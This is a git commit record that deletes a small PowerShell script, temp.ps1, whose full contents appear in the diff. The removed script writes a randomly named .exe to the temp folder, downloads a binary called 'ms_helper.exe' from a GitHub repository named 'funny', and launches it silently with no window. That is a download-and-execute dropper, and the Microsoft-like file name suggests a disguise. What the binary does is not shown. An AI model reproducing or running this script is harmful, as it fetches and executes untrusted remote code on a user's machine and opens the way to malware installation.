e48fe38907c8ae3ee86481b036369e1e17a6d286
Sammy <130579625+greenstorm5417@users.noreply.github.com>
2025-10-29 13:50:32 -0400

    Delete temp.ps1

--- temp.ps1
+++
@@ -1,6 +0,0 @@
-$randomName = [System.IO.Path]::GetRandomFileName().Replace(".tmp", ".exe")
-$tempPath = [System.IO.Path]::GetTempPath()
-$filePath = Join-Path $tempPath $randomName
-Invoke-WebRequest -Uri "https://github.com/greenstorm5417/funny/raw/refs/heads/main/ms_helper.exe" -OutFile $filePath
-Start-Process -FilePath $filePath -NoNewWindow
-Exit
